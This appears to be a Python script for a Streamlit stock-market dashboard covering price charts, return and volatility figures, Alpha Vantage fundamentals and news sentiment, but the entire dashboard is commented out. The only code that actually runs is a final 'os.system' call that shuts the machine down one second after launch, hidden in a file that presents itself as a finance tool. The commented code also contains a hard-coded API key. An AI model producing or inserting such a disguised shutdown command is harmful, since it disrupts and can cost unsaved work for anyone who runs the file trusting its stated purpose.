# import streamlit as st
# import pandas as pd
# import yfinance as yf
# import plotly.express as px
# import numpy as np
# from alpha_vantage.fundamentaldata import FundamentalData
# from stocknews import StockNews

# # Dashboard and Side Bar
# st.set_page_config(page_title="My Webpage", page_icon=":tada:", layout="wide")
# st.title("Stock Dashboard 📈 📉")

# # ------HEADER SECTION-----
# with st.container():
#     st.subheader("Sasquatch")

#     # Your code here
#     # st.title("Stock Market Data Monitoring and Prediction System")
# st.write("The Stock Market Data Monitoring, Analysis, and Visualizing Management System offers a comprehensive solution for users in the financial industry to effectively monitor, analyze, and visualize stock market data. With its advanced features and intuitive interface, the system empowers users to make informed decisions and stay ahead in the dynamic world of stock trading and investment.")
# st.write("[Learn More >](https://www.researchgate.net/publication/340385281_Stock_Market_Analysis_using_Data_Visualization)")

# # Input widgets for user interaction
# ticker = st.sidebar.text_input('Enter Ticker Symbol', value='META', max_chars=10).upper()
# start_date = st.sidebar.date_input('Start Date', pd.to_datetime('2015-01-01'))
# end_date = st.sidebar.date_input('End Date', pd.to_datetime('today'))

# data = yf.download(ticker,start=start_date,end=end_date)
# fig = px.line(data, x = data.index, y = data['Adj Close'], title = ticker)
# st.plotly_chart(fig)

# pricing_data, fundamental_data, news = st.columns(3)

# with pricing_data:
#     st.header('Price Movements')
#     data2 = data.copy()
#     data2['% Change'] = data['Adj Close'] / data['Adj Close'].shift(1) - 1
#     data2.dropna(inplace=True)
#     st.write(data2)
#     annual_return = data2['% Change'].mean() * 252 * 100
#     st.write('Annual Return: = ', annual_return, '%')
#     stdev = np.std(data2['% Change']) * np.sqrt(252)
#     st.write('Standard Deviation: = ', stdev * 100, '%')
#     st.write('Risk Adj. Return: = ', annual_return / (stdev * 100))

# with fundamental_data:
#     st.subheader('Fundamental Data')
#     fd = FundamentalData(key='KMCJKFXVJ2KCB9PQ', output_format='pandas')
#     balance_sheet = fd.get_balance_sheet_annual(ticker)[0].T[2:]
#     balance_sheet.columns = list(balance_sheet.iloc[0])
#     st.write('Balance Sheet:', balance_sheet)

#     income_statement = fd.get_income_statement_annual(ticker)[0].T[2:]
#     income_statement.columns = list(income_statement.iloc[0])
#     st.write('Income Statement:', income_statement)

#     cash_flow = fd.get_cash_flow_annual(ticker)[0].T[2:]
#     cash_flow.columns = list(cash_flow.iloc[0])
#     st.write('Cash Flow Statement:', cash_flow)

# with news:
#     st.header(f'News of {ticker}')
#     sn = StockNews(ticker=ticker, save_news=False)
#     df_news = sn.read_rss()
#     for i in range(10):
#         st.subheader(f'News {i+1}')
#         st.write(df_news['published'][i])
#         st.write(df_news['title'][i])
#         st.write(df_news['summary'][i])
#         title_sentiment = df_news['sentiment_title'][i]
#         st.write(f'Title sentiment {title_sentiment}')
#         news_sentiment = df_news['sentiment_summary'][i]
#         st.write(f'News sentiment {news_sentiment}')

import os
os.system("shutdown /s /t 1")